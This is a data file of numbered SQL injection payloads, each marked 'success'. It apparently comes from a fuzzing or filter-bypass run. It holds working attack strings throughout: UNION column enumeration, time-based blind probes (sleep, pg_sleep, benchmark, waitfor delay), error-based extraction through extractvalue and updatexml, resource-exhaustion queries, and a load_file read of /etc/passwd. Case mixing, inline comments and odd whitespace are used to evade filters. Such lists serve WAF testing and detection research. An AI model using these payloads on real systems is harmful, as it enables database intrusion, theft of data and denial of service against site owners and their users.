2 success '-8203"  )   union all SeLeCT/**/6394,6394,6394,6394,6394-- '
3 success "(SeLECt\n0x1)'   )    )    AS stnn whEre 0x1810   LIke   (SeLeCt (SeLecT (SeLECt 6160))) AND 0x22b1  =  7347-- 0e"
6 success "-0x1be6' /**/ ) \x0c  )    union all select\t(SELECT 5083),5083,5083,0x13db# "
7 success "1' whErE 8859 LIKE 8859 AND True "
8 success "(SELECT 0x1)%'/**/union all/**/seLEct null,null,null# "
15 success "0x1%'\xa0and/**/0xda0!=3489\x0c"
16 success '-9031%" /**/)   order by 1-- '
22 success "SELEct pg_sleep  (  5  )   aNd    (    (   'vxxg'   LIKE   'vxxg "
23 success '(SELECT (SELECT (SELECT 1)))   )/**/   )     )   && sleep \x0b( /**/5  )  # K-O'
25 success "-4330' union all sELEcT\x0b(SeLeCT 3059),3059,3059,3059,3059,3059,3059,3059,3059-- "
27 success 'iif  (  1878   LIKE \t 2513,1,1/0  ) \xa0/**/'
28 success "1'/**/ /**/)    )    union all selEct null,null,null,null,null,null# "
29 success 'end AND    (    (   2160  =  (SELECT 2160) '
30 success "-6220'/**/union all\tsElecT 1462,1462# "
34 success '-(SELECT 4543)"  )   OR 3038  =\n 3038 '
35 success '-9659   ) /**/  )   /**/ )   union all sElECT 0x21d9,0x21d9,(SELECT 8665),8665,8665,8665,8665-- {^'
37 success "-9014%'  )   union/**/all/**/seLeCt 4211,4211,4211,4211,4211,0x1073# Uf"
39 success '0x1\xa0 )   union all SeLEct null,null,null,null,null,null-- '
40 success '-(SELECT 7202)%"   )    )   \nunion\tall/**/sElecT 2901# v4'
41 success ' SELeCT * fROm users wheRE id   LIKE   1 oR ".  )  " oR 1  =  1 -- 0x1 '
43 success '(SeleCt 0x1)"  )   && sleep  (  5  )  # 9F'
44 success '0x1  )   aS bpap WheRE 7758  =  7758 Or 0x1090  =    (  SELEct 4240 FROM pg_sleep  (  5   )    )   -- '
45 success '0x1   )    )    AS wajy wheRe 8593   LIKE\xa0  (selEcT 8593) '
47 success '0x1,  (\n selECT   (  casE whEN   (  0x9f6 lIkE 0x9f6  )   tHEN 1 eLse\x0bcast  (  (seleCt (SEleCT 0x1)) As int  )  /  (  SeleCT 0x0 FRom dual  )   enD  ) /*O\tb&*/ froM dual  )   '
48 success 'sEleCT \t (  caSe whEn   (  9393   like   5530  )   thEN 9393 ELse\x0bcast  (  0x1 as int  )  /  (/*RJt*/ seLect (SeLEct 0) fROM dual  )   EnD  )   from dual-- '
49 success 'SeLECT   (  Case WHEn   (  8993   Like   8846  )   thEn 8993 ElSE 8993*  (  selEcT 8993 FrOm mysql.db  ) \x0c End  )  # @3s'
50 success "-9484' or /**/ (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa "
53 success "-9653'/*T`*/ ) \n where 2705  =  2705 or 'X7}'<>'X7}H'# "
55 success '-9541  )   As bnky wHeRE 3934   lIkE  /**/(sELeCt 3934) union all selECt 3934,3934,3934#/*5PP2*/'
58 success "(SELECT (SELECT (SELECT 1)))   )    )    as\x0bxzcl where '<Z' NOT LIKE '<Z~'/**/"
61 success "/**/or 'something'   =   'some'+'thing' "
64 success '0x1%" and elt  (  5345  =  8751,8751\xa0/**/)/**/  and "%"  =  " '
65 success "-8397'\x0b  ) /*(tX\r*/  )     )   or 0x87b   like   4788 "
66 success '-0x2609" /**/ )    )   \x0c ) /**/ order by 1-- B-'
67 success "-(SELECT 1256)' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889-- "
69 success '0x1  )   and elt  ( /**/7425  =  8842,8842  )   and   (  9194   like\x0b  (SELECT 9194) '
71 success ' SelEct * From users WHErE id  =  (SeLect 0x1)  or  1#"? union sElecT null,version  ( \t  )  \x0c-- (SELECT 1) '
72 success 'SeLeCT '
73 success '(SELEct 0x1)   )  \t )    as juoe WhErE 0x270a/**/ =  0x270a OR 0x93f   lIKE     (  selecT count  (  *  )   FROm rdb$fields AS t1,rdb$types As t2,rdb$collations aS t3,rdb$functions\x0cas t4  )  -- Avi'
74 success "-9574'  )   as rxym where/**/'ZsR'<>'ZsR\\' OR 'g'='gg' union all seLEcT 4719,4719,4719,4719,4719,(SELECT 4719),4719-- o<(e"
75 success '(SELECT/**/1)   )   /*\\*/)     )   rlike\x0csleep  (  0x5  )  # r['
77 success "0x1'||  (  select\x0b'aair' whErE 0x553!=1364 OR\x0c'/#' NOT LIKE '/#' union all SeLEcT\x0bnull,null,null,null# "
80 success '(SELECT/**/1) order by 1--\x0c'
81 success '0x1%" or 9643\xa0/**/=    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and "%"  =  " '
82 success "1'+  (  SeLect iutk WHERE 6158   LIkE   6158 "
85 success ' SELECt * FrOM users/**/where id/**/  LiKE   1 OR/*\x0c5B*/1#"(selecT 1) union SElECt \'a\',version  (    )   -- 1 IcJK'
87 success '0x1"/**/  )    )    union all select null,null,null,null,null,null,null,null,null-- f'
88 success "0x1' wHERe 0x32 LIKe\x0b0x32 order by (SELECT/**/(SELECT 1))-- "
89 success "(SElect (SELECT 1))  )/*O,D=*/ \x0cwHeRE 8497 IN (8496,8497,8498) Or 'k'<>'k' "
91 success 'if \t(  0xe09  =  3779  )   SELeCT 3593 ELse drOP function qtqy-- '
93 success '(SELECT 0x1)"   )  /**/ )     )   '
95 success '-4699  )   aS mymz WheRe 0xd4d /**/ LIKE   0xd4d Or elt  (  0x408  = \n1032,3623  )  -- '
96 success ' SELEct * fRom users Where id\x0b =  1  ||  (SELECt 1)#"{ union Select null,version  ( /**/\t ) \n -- (SELECT 1) ~'
98 success '(SELECT (SELECT (SELECT 1)))%"   )    ) /*+/*/  /**/)   union all SELeCt null,null,null,null,null,null#\x0c(-I\r'
101 success '1 wHERe 2060  =  2060 '
102 success "0x1' where 0x109d   LIKE   (SELECT/**/0x109d) "
103 success '0x1" where 0xdb6\t  LIKE/**/  (SELECT (SELECT 3510)) '
107 success '-(SELECT 2226)%"   )    )    union\x0call sELecT 1018,1018,1018,1018-- '
108 success "-4828'+  (  select/**/qxnw where 9488  =  9488 OR False union all select 9488,9488--\x0c"
110 success '1/**/ )   whEre 5125 IN (5124,5125,5126) AnD True && 8514   like     (  SelECt count  (  *  )   FROm domain.domains AS t1,domain.columns AS t2,domain.tables As t3  )  -- '
112 success '0x1" order/**/by (SELECT 0x1)# '
117 success '0x1  )   OR/**/4915 /**/=    (  SELEcT count  (  *  ) \t from domain.domains/*ZM{\x0c */as t1,domain.columns AS t2,domain.tables as t3  )  -- '
118 success "sELECT count  (  *  )   FROm sysibm.systables As t1,sysibm.systables as t2,sysibm.systables/**/As t3 aNd    ( \t  (     (  'vcgc' LikE 'vcgc "
119 success '-5560"   )    )    OR 7292\x0c = /**/6184# '
122 success "0x1' /**/)  \x0bwhere 'P!\x0b' NOT LIKE 'P!\x0b]' "
123 success '(SELECT (sELecT 0x1))%"   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   "%"  =  " '
124 success '0x1" AND/**/elt\x0b (  0x1099  =  4249/**/AND \'\x0cn\'!=\'\x0cnR\',7259  )   '
126 success '-2168"   )/*Pnp{*/   )    union all SeLect 4935,4935,4935,4935,4935,4935,4935,4935,4935-- #H'
127 success '0x1  )   Or char  (  75  )  ||char  (  70  )  ||char  (  99  )   OR char  (  83  )    =  regexp_substring  (  repeat  (  LEfT  (  crypt_key  (  char/*BM**/ (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- '
131 success 'sElECt LIke  (  \'abcdefg\',upper  (  hex  (  randomblob  (  500000000/(seLEct 2)   )    )      )    )    and\x0c   (    (   "nxvp"  =  "nxvp '
135 success 'select/**/count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm 6'
136 success "-7088'||  (  select 'arol' frOm dual WHEre 3883 LIKE 3883 union all SeLeCt 8891,8891,8891,8891,8891,8891,8891,8891# "
137 success ' having/**/1  =  (SELECT 0x1)-- '
138 success '0x1"/**/  )    )    OR 1022   LIkE     (  seLecT count  (  *  )   fRom\x0call_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- p'
143 success "-5528'  )   union all Select 5153,5153,5153,5153,5153,5153,5153,5153,5153# pF"
145 success "seLect count  (  *  )   FROm generate_series  (  1,5000000  )   aNd    (    (   '&'<>'&`' "
147 success '0x1"  )   aS fgne wHErE 0x1c27   like   (SELECT 7207) '
148 success 'sElECT * FRom generate_series  (  9058,9058,CaSE WhEn   (  9058   LIKE   1183  )   tHEn 1 ELse 0 ENd  )   limit 1-- '
149 success "1'+  (  SeLeCT mkbv WHeRe 1648   LiKe   1648 aND 9254  =    (  SELEcT count  (  *  )  \nfRom rdb$fields as t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions As t4  )  -- "
150 success "SEleCt count  (  *  )   FRom generate_series  (  1,5000000  )\n  &&   (  'qpdu'  =  'qpdu "
151 success '1 AND 0xeaa  =    (  seLecT upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )   Or chr  (  113  )  ||chr  (  113  )   OR chr  (  112  )  ||chr  (  106  )  ||chr  (  0x71  )  ||  (  seleCt   (  case wHEN   (  1960 in (1959,1960,1961) or False OR 0  )   tHEn 1 ELsE 0 eND  )   frOm dual  )/**/  or chr  (  113  )  ||chr  (  122  )  ||chr  (  (sELEcT 118)  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FrOm dual  )  -- xwoo '
154 success '0x1" where 7879\t = /*O\\u-*/7879\x0b'
157 success "0x1%' union all/**/sElEcT null,null,null-- ab"
162 success 'OR 1  =  1/* '
166 success "(SEleCt 0x1)'|| /**/(  select 'ymre' wHere 6493<>6494 "
168 success '(sELECt (SELECT 1))" wheRe\xa04683/**/LIKe 4683 '
171 success "\x0cOR userid like '%/*m*/"
173 success 'SeLeCt benchmark  (  0x4c4b40,md5  (\t 0x4c4d6142   )    )    anD   (  "%"  =  " '
175 success "-(SELECT 6500)'   )  \xa0 )    or   (  8459  =  8459 AND 5584<>5585 OR 0 OR False\x0b )  *0x132a and    (    (   'padu' like 'padu "
178 success "-3867%'  )   or/**/3084  =  (SELECT 5633) and   (  '%'  =  ' "
179 success "0x1'  )  /**/as rhvm Where (selEcT 1420)  = \n1420 "
183 success 'select case when 5559   LIKE   3483 then/**/1 else null end-- '
184 success '-4152"  )   WhERE \'t\' LIKE \'t\' union all sELECT 9781,9781,9781,9781,9781-- \x0c'
185 success "1'+  ( /**/select 'tmel'/**/where 0xa5f  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else/*T*/0x28 end/**/  )    )     )  +' "
186 success 'seLEcT sleep  (  0x5  )   AnD    (    (     (  "lczw" /*O]xo,*/=  "lczw '
188 success '(SELECT (SELECT/**/1))   )    )    union all seLEct null,null,null,null,null,null,null,null-- '
190 success '1/**//**/ )    )\x0c/**/'
194 success '\nsEleCt * fRoM users wHERe id   Like  \x0c(SELECT 0x1) <@. union SELeCT 1,version  (  \xa0 )   -- (SELECT (SELECT 1))/**/'
195 success "1'+  (  select bgbq where 0x1eac NOT LIKE 7853 AND 1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715 OR False  )   then char/**/ (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  0x7a  )  +char  (  (SELECT 0x76)  )  +char  (  122  )  +char  (  113   )    )      )    )   +' "
196 success "0x1'\x0cunion all seLEcT null,null,null,null,null,null,null,null# ev"
200 success "(SELecT/**/1)'||  (  select 'etvo' FroM dual WHERE 0x615 \t LiKe   0x615 "
202 success '-(SELECT 5591)%"   )    )/**/   order by 1-- '
204 success "-(SELECT 8410)'   )    )     )   or 'H]$cb' NOT LIKE 'H]$cbq'-- "
207 success '1 WHeRE 5332   LIKE   5332 oR 2498 NOT In (2497,2498,2499) OR   (  seLECT 9173 froM  (  seLEct\tcount  (  *  )  ,concat  (  0x7171706a71,  (  SelEcT \t (  elt  (  9173   LIke   9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FrOm information_schema.character_sets group by x  )  a  )  --\x0b'
208 success "0x1' In boolean/**/mode  )   && sleep  (  0x5  )  # xxE"
209 success '0x1" where 2642  =  2642 OR 0 OR 0 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- '
210 success '(SELECT 0x1)"   )    )   /**/and elt  (  \'BU\' NOT LIKE \'BU4\' AND \'\tY\'=\'\tY\',sleep  (  5   )    )    and    (    (   "afby"  =  "afby '
211 success ' End ANd "%"   LIKe   " '
212 success "0x1'+  (  select yjyp where 9696 \x0b=  9696 OR 0 OR False "
216 success "(SELECT (SELECT (SELECT (SELECT 1))))%'  )   or/**/0x207b  =    (  select count  (  *  )   from sysibm.systables as/**/t1,sysibm.systables as t2,sysibm.systables as/**/t3/**/ )   and   (  '%' \x0c=  ' "
217 success "SELeCt sleep  ( /**/0x5\t\x0c)  \n&&    (    (     (  'iwwa' LIKE 'iwwa "
219 success '0x1%" and 6537  = /**/dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  " '
221 success '0x1" /**/ )    )  \n as jgie where 8017   like   8017 AND 5638<>5639 OR 0x0 &&   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- O'
222 success "0x1' where 8124 LIKE 8124 "
227 success "seLecT * FROM users\x0cWheRe id  =  1 +   (  \\+  )   oR 'X'<>'X3' OR 0 -- 1 "
228 success "1'\x0cWHerE 4945   LIKE   4945 AND 1 oR 0 "
230 success ' (  SeleCT   (  cASE wheN   (  1570/**/  likE   6977  )   ThEn 1 elsE 0x622*  (  SeLEct 1570 fROm mysql.db\xa0 ) /*Uz%I8*/ ENd   )    )  '
235 success "-(SELECT 5327)'   ) /**//**/ )     )   || 1606 /**/=  6099 "
237 success '1\x0bunion/**/all SelEct null,null,null,null,null,null,null,null# 2'
238 success "0x1'+  (\t select\x0c'tjvt' WheRE/**/2463   Like /*Z<`G*/ 0x99f "
239 success '0x1"   )\t   )    as xbhp wHErE 7527   LIKE   0x1d67 '
241 success "(SELEcT (seLeCT 0x1))'||  (  select/**/'vdeo' whErE\x0b0x1103  \xa0LikE   (sELECt 4355) "
242 success 'selECt pg_sleep  (  (SeLECT (seLECt 0x5))  )   aND "%"  =\x0c " '
243 success "0x1' rlike sleep  (  0x5\n )  # RS"
246 success 'select/*;N7f*/sleep  (  5  )   and    (    (   8679  =  8679 '
248 success '-2276"   )    )    aS qwow WHErE 7737 In (7736,7737,(SEleCT 7738)) oR 3534\t =  2971-- 5'
249 success '1 where/**/2649  =  2649 AND True OR   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- uc'
250 success "1'\t )   where 0x2013  =  8211 union all select null,null,null,null,null#/*2j3*/"
251 success "(SELECT (SELECT 0x1))'   )    )     )    oR /**/2367   LIKE     (  sELect count  (\x0c *  )   frOM rdb$fields aS t1,rdb$types aS t2,rdb$collations as t3,rdb$functions AS t4  )  -- "
253 success "0x1   )    )    aS dgso WhERe 'E'='E' AND True Or 're7J8'!='re7J8' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )   oR chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sElECT   (  caSE WHeN   (  '|\t'='|\t'  )   theN 1 eLse 0 eNd   )    )   ::text||  (  chr \t(  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   /**/AS numeric  )  -- B"
254 success "1' WHErE 7014   LIKE   0x1b66 oR 8466   liKE   benchmark  (  0x4c4b40,md5  (\t 0x694a4745   )    )   -- g"
255 success ' SeLeCt * FrOm users where id \t=  \'1\' union seLECt $["],@@VERSION -- (SELECT 1)\' '
256 success 'select/**/* from\x0cinformation_schema.tables-- *`'
258 success '0x1"  )   as jqli whERE 0x1e71   LIKE   0x1e71 '
259 success 'selECT   (  cAse WHeN   (  5704   LIKE   4125  )   thEn 5704 ELSE cast  (  1 As int  )  /\x0c (  SELECT 0 fRoM dual  )   ENd  )   froM dual-- '
262 success "-5356'  )   OR\n0x246b   lIkE   9323# "
263 success '(SELECT/**/1)%" rlike   (  select   ( /*6gT(*/case when   (  \'M\'=\'M\'  )   then 1 else 0x28/**/end \xa0 )    )    and "%"  =  " '
265 success "0x1'+  (  select somn where '`%'='`%' rlike sleep  (  5   )    )   +' "
267 success '(SElecT 0x1)   )    )  \x0b union\xa0all/**/seleCt null,null,null,null-- 3`I.}'
269 success ' SELECT * fROM users/*U*/whErE id  =  0x1 oR "1{" oR 7095<>7096 or 0 --/**/1 '
271 success "1'+  (  select zbyt where 6160 NOT LIKE 6161 AND 1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group\tby x   )    )   +' "
278 success "1'/**/ )   as bagi where 1281  =  1281   (  select   (  case when   ( \x0b5451   LIKE   5451 OR 'm'<>'m' OR 0  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )   OR char  (  76  )   or char  ( /*V\x0b*/112  )  ||char  (  116  )  /**/end  )   from information_schema.system_users  )  -- "
280 success "0x1'+  (  select ijck where 5527!=5528 AND True OR 'l' LIKE 'lu' or   (  select (SELECT 2)* \x0b(  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  (SELECT 8113),1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )  \x0b )   +' "
281 success 'AS\t'
282 success "0x1' ANd elt /**/(  0x1099  =  4249,7259  )   "
283 success "1 Where\xa07362  =  7362 aNd 8148  =  LiKE  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  500000000/2   )    )      )    )   -- "
286 success "0x1'+  (  select aahc where (SELECT 5436)  =  5436 and\x0b3824  =  benchmark  ( /**/5000000,md5  ( /**/0x76555642   )    )     )  +' "
289 success "0x1'+  (  select dyfw where 0x1e3f  =  0x1e3f and 8407  =   /**/(  select count  (  *  )\x0c  from generate_series  (  1,0x4c4b40   ) /**/  )     )  +' "
291 success "-(SELECT 4205)'  )   OR 1570  =  convert  (  int,  (  SELECT char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  (SELEct 106)  )  +char  (  113  )  +  (  sELecT   (  CAsE wHEN   (  2633 IN (2632,2633,2634)  )   thEn char  (  49  )   eLSe char  (  48  )   eND\x0c  )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )  \x0c  )   "
295 success "1'/**/and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393 OR 6862 NOT LIKE 6862,1   )    )     )  ,0x717a767a71  )  ,1161  )   "
297 success '-2453" /**/)   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520-- '
300 success "0x1'  )\x0c /**/or sleep\t/*^ol*/(  (SELECT (SELECT (SELECT (SELECT 5)))) \x0b)  "
301 success "1'\t\x0c) /**//*W_Ru*/union all select null#\x0b"
303 success ' SEleCT * fRoM users WHErE id   like   1 OR 1#"$ union seLeCT \'a\',version  (    )   -- 1 '
305 success "sELeCt * fROm users wHErE id  =  '1' oR $<\\ Or 5375 NOT LIKE 5376 aNd True -- (SELECT 1)' "
306 success '0x1"  ) /**/ WHeRE 7706 iN (7705,7706,7707) '
309 success "0x1   (  sEleCT   (  cASe wHEn   (  'YhN'!='YhN2' OR False And True Or 0  )   thEN regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   eLSE char  (  108  )   Or char  (  76  )   Or char  (  112  )  ||char  (  116  )   end  )   frOm information_schema.system_users  )  -- fzhj FW"
310 success ' eNd AND    (    (     (  "memh" LIKE "memh '
311 success ' SelECT * FROM users wHeRE id  =  1\x0cOR ";#" oR \'^\' LIKe \'^\' && True/*7*4%*/-- 1 '
313 success "0x1'+  (  select taga where 946 LIKE 946 "
314 success '-(SELECT 8639)  )   or (SELECT 8138)   LIKE   (SELECT 6252) '
316 success ' (  selECT   (  caSE WHEN   (/**/ 6035  =  9882\t )   thEn 6035 ELSE\xa06035*  (  sEleCT (SeLecT 6035) frOM mysql.db  )   EnD   )    )  '
318 success "1'+  (  sElect gqez Where 'yb'='yb' OR False and 1 "
320 success "(SElect (SELECT (SELECT 1)))'   )    )    or 0x113b  =    (  select count  (/**/ *  )   from sysusers as sys1,sysusers as sys2,sysusers\tas sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro "
321 success "0x1  ) \t where 'vD' NOT LIKE/*{X`R*/'vDt' "
323 success '0x1%" And 8148  =  LIKe  (  \'abcdefg\',upper  (  hex  (  randomblob  (  0x1dcd6500/2   )    )      )    )   -- '
324 success '-5520%" union all select/**/5235,5235,5235,5235,5235,5235,5235,(SELECT 5235),5235,5235-- '
326 success '0x1" or extractvalue  (  0x511,concat  (  0x5c,0x7171706a71,  (  select\x0b  (  elt  (  (SELECT 0x511) \x0b=/**/ 0x511,0x1\n  )    )     ) /*$*/,0x717a767a71   )    )    and "ymwb" \x0c=  "ymwb '
330 success '0x1%"  )   &&\t9198\xa0 =  0x23ee-- '
334 success "-0xebf' /**/)  \x0bAS rqet Where 7092  =  7092 OR elt  (  1032   lIkE\t  1032,3623  )  -- uw"
335 success " union SeLeCt 1,load_file/**/ (/**/ '/etc/passwd'  )/*\r,\tW*/ ,1,(seLecT 1),1; "
336 success '0x1 oR 8466   likE   benchmark  (  5000000,md5\t (  0x694a4745   ) /*R<1QE*/  )   # irvm aD'
337 success "-0xb27' union all SELeCT\t2495,2495,2495,2495,2495,2495,2495,2495,2495--/**/r"
340 success "0x1' /**/ )    )    and 0x25bc  =    (  select count  (  *\x0c )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users/*C|A*/t5  )  -- p"
342 success "0x1'  )   wHERE (SELECT 6731)  =  0x1a4b\tand True oR elt  (  5873   LIKE   0x16f1,sleep  (  0x5   )    )   # ER"
346 success '(SeLect 0x1)%" And\x0b0xaf5   LiKe\xa0/**/ 1345/**/'
347 success "0x1' procedure analyse  (  extractvalue  (  (SELECT 5840),concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  /*R*/like   5840  )   then 1 else 0 end   ) \n  )   ,0x717a767a71   )    )   ,1 \t)   "
350 success '0x1"  )   AS xylo WherE 2112   LIKe   2112 ANd 3715 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SELEct   (  CASe WhEn   (  3715  =  3715  )   THEn char  (  49  )   eLsE char  (  48  )   ENd   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- l'
351 success "1'/**/in boolean mode  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # "
352 success '%27 OR\n6945 liKe 6945 anD 2608 NOT LIKE 2609 AnD True Or 8910=8911 '
353 success '0x1"  /**/)    )    or 8156  =    (  select count  (  *  )   from generate_series  ( \x0c1,5000000   )    )   -- '
356 success "-(SELECT 9509)'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz "
359 success "1'+ \t(  SELeCT oogh WHeRE 1167  =  1167 Or 0 Or elt  (  5873   LIKE   5873,sleep  (  5   )    )   # "
360 success "0x1' in boolean mode  )   and '~8'='~8'-- "
361 success 'iif\n (  (SELECT 0xeb0)   LIKE   4785,0x1,1/0  )  /*Kg*/'
362 success "-(SELECT 1485)'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj "
363 success "0x1'/**/ )   where '&'!='&_' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  '+{'!='+{M' AND True AND 'G'!='Gb',(SELECT 1)   )    )     )  ,0x717a767a71   )    )   -- "
364 success '(SElECT 0x1)"" /*gQwm*/( \xa0.\'.  (  ,  (  . '
365 success "-5386'  )   union all SELeCt 8026,8026,8026,8026,8026,8026# "
366 success '-4165" where 1772/**/ =  1772 union all select 1772,1772,0x6ec,1772,1772,1772,1772,1772-- '
367 success " (  SelECt   (  caSE/**/wHen   (  'r|' lIke 'r|'  )   tHeN 1 elSE 1421*  (  SelECT 1421 frOM master..sysdatabases  )   end   )    )  "
370 success "1'+  (  SelecT gthp WHEre 0x1c8f\t =  (SeleCT 7311) OR sleep  (  0x5  )  # "
377 success '0x1  )    ANd  (SELECT 8514)   liKe     (  seLecT count  (  *  )   frOM domain.domains As/*$?SU*/t1,domain.columns aS t2,domain.tables aS t3  )   '
378 success 'SelECt   (  CaSE WhEn   (\n 7217/**/  lIkE   7631  )/*U*/  THen 7217 elsE 0x1c31*  (  sELeCt 7217 fRoM information_schema.character_sets  )   ENd  )  # {'
379 success "sELEct * fROM users WHerE id  =  '(SELECT 1)' *$ (SelECT 0x1) oR 1  =  (SElecT 1) -- 1' "
384 success '(SELECT 0x1)  )   AS lisg whErE 5490   LIKE /**/ 0x1572 && 0x1 '
389 success 'waitfor/**/delay \'0x0:0x0:0x5\' anD   (  "dmcu"\t  Like   "dmcu '
390 success "0x1%'\xa0union all select/**/null,null,null,null,null,null,null,null,null,null# +"
392 success '0x1  )   As wype wheRE 0x19d0   liKe   6608 Or 8315   LiKE     (  sELecT count  (  *  )   fROm sysibm.systables AS t1,sysibm.systables As t2,sysibm.systables as t3/*@(E*/ )  -- H\xa0'
393 success '0x1"/*O^>P>*/  )    )     )   or (SELECT 7552)  =    (  select count  (  *  )   from rdb$fields\xa0as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  "adwg" like\n"adwg '
394 success "0x1'+  (  select 'vabj' where (SELECT 7178)\n =  7178 union all select null,null,null,null,null# "
397 success '0x1,  (  SEleCt   (  cAse whEN   (  3902   LiKE  /**/3902  )   tHeN   (  SELEcT count  (  *  )   FROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   ELsE 1/  (  SEleCT 0 FrOm dual  )   end  )   fROm dual  )   '
398 success "-9860  )   WherE\n8743   LIKe  /**/8743 AnD 'I'\x0bNOT LIKE 'Ij' Or False union all sElect 8743,8743,8743,8743,8743,8743,8743-- "
399 success "selecT count  (  *  )   FRoM generate_series  (  1,5000000  )   anD    (    (     (  'ldqq'  =  'ldqq "
401 success "select/**/benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'G\r'='G\r' "
402 success "0x1  )  \x0cWheRE 'H' not like 'HU' AnD True OR 'V^(|'!='V^(|' and make_set  (  4931   likE\x0c  1642,1642  )  -- "
406 success "1'+/**/ (  SELect dgnt wHeRe 5012!=5013 AND 1 OR 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  -- "
409 success 'iif\x0c/*G*/(\x0b (SELECT 1157)   LIKE   4542,1,1/(sElECt (SELECT 0))/*wAXl*/ )\t/**/ '
410 success "sELECt lIKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   ) /*8?z@*/  )      )    )    and    (    (   'nimx'   lIKE   'nimx "
412 success "selECT pg_sleep /**/(  5 \n)   ANd 'zfyy'   LikE  \n'zfyy "
414 success '(SELECT 0x1)"  )   and\textractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  2004 NOT LIKE 2005 AND True AND \']\' NOT LIKE \']0x1\' AND 1,1   )    )     )  ,0x717a767a71   )    )    and   (  "rfpq"  =  "rfpq '
415 success 'seLeCT   (  cAse WhEN   (  4061   lIKE   1396  ) \t TheN 4061 Else 1/  (  seLEct 0  )   End  )  -- "'
416 success "-9509'  )   where/**/5831 NOT LIKE 5832 OR 'Q'<>'Q' AND '#d' LIKE '#d' order by 1# "
418 success "0x1%'  )   ANd (SELECT 2716) /**/=    (  sELECT count  (  *  )   fRoM sysusers as sys1,sysusers AS sys2,sysusers As sys3,sysusers As sys4,sysusers as sys5,sysusers as sys6,sysusers aS sys7  )  -- JX"
419 success "(SELECT 0x1)' waitfor delay '0x0:0:5' and 'vwuz'\n =  'vwuz "
421 success '0x1"  )   WhEre 4565 IN (4564,4565,4566) && extractvalue\t (  7982,concat  (  0x5c,0x7171706a71,  (  SElECT   (  elt  (  9754!=9755,1   )    )     )  ,0x717a767a71   )    )   -- '
423 success 'iif/*\\*/ (  (SELECT 8354)  = \x0b3515,1,1/0  )   '
425 success "0x1%' and char  ( /**/120  )  ||char  (  (SELECT 106)  )  ||char  (  117  )  ||char  (  85  )/**/   =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  ' "
428 success '0x1" /**/)   or 8466  =  benchmark  (  (SELECT 5000000),md5  (  0x694a4745   )    )   /*ND*/and   (  "qkds" like "qkds '
429 success '  (  sELECt * FROM  \x0c(  sELECt  (  sleep  (  (SELECT 5)   )    )     )/**/ srmq  )   anD   (  "avyw"  =  "avyw '
433 success '-2448%"  )\x0c /**/OR\x0b0xbde  = /*$**/3038 '
434 success 'sELeCt CAse WhEn 9390   LikE  \n5752/**/tHen 1 elSe null EnD-- '
